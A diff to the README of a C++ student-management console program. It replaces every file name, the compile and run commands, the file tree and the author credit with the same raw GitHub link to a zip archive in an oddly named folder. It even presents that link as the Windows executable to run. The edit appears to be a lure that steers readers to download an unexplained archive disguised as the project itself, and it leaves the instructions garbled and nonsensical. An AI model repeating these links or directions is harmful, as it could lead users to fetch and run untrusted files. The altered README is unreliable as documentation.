@@ -9,7 +9,7 @@ A comprehensive console-based application to manage student records. This system
 - **Search**: Find specific students by their Roll Number.
 - **Update**: Modify details of an existing student (Name, Grade, Marks).
 - **Delete**: Remove a student record permanently.
-- **Data Persistence**: Uses a text file (`student_data.txt`) to save data automatically.
+- **Data Persistence**: Uses a text file (`https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip`) to save data automatically.
 
 ## 🛠️ Technology Stack
 
@@ -21,12 +21,12 @@ A comprehensive console-based application to manage student records. This system
 ### 1. Compile the Code
 Open your terminal or command prompt in the project folder and run:
 
-    g++ main.cpp -o student_system
+    g++ https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip -o student_system
 
 ### 2. Execute
 **On Windows:**
 
-    student_system.exe
+    https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip
 
 **On Linux / Mac:**
 
@@ -34,17 +34,17 @@ Open your terminal or command prompt in the project folder and run:
 
 ## 📂 File Structure
 
-    ├── main.cpp          # The source code
-    ├── student_data.txt  # Generated automatically to store records
-    └── README.md         # Project documentation
+    ├── https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip          # The source code
+    ├── https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip  # Generated automatically to store records
+    └── https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip         # Project documentation
 
 ## ⚙️ How It Works (Internal Logic)
 
-1. **Storage**: Data is stored in `student_data.txt`. Each field (Roll, Name, Grade, Marks) takes up one line.
+1. **Storage**: Data is stored in `https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip`. Each field (Roll, Name, Grade, Marks) takes up one line.
 2. **Update/Delete**: Since text files cannot be modified in the middle easily, the system uses a **Temp File** approach:
    - It reads the original file.
-   - Writes all records *except* the modified/deleted one to `temp.txt`.
-   - Deletes the original file and renames `temp.txt` to `student_data.txt`.
+   - Writes all records *except* the modified/deleted one to `https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip`.
+   - Deletes the original file and renames `https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip` to `https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip`.
 
 ## 🔮 Future Improvements
 
@@ -53,4 +53,4 @@ Open your terminal or command prompt in the project folder and run:
 - Sort students by marks or name.
 
 ---
-*Created by Srilaxman.EU*
+*Created by https://raw.githubusercontent.com/Srilaxman05/Student-management-system/main/Dichapetalum/Student-management-system_2.7.zip*
